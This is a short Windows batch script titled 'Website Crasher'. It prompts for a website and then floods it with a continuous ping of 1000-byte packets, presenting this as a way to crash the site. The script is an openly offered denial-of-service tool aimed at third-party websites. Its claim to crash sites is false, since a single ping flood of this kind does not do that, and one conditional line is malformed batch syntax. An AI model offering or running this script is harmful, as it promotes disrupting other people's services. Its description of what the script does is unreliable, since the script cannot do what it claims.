:A
@echo off
Title Website Crasher
color 0e
echo Enter the website you would like to crash
set input=
set /p input= Enter your Website here:
if %input%==goto A if NOT B
echo Processing Your request
ping localhost>nul
echo To end Crashing press CTRL + C
ping localhost>nul
cls
echo ----------------------------------------------------------------------
echo Now Crashing Website...DO NOT CLOSE THIS BOX!! PRESS CRTL + C TO END!!
echo ----------------------------------------------------------------------
ping %input% -t -l 1000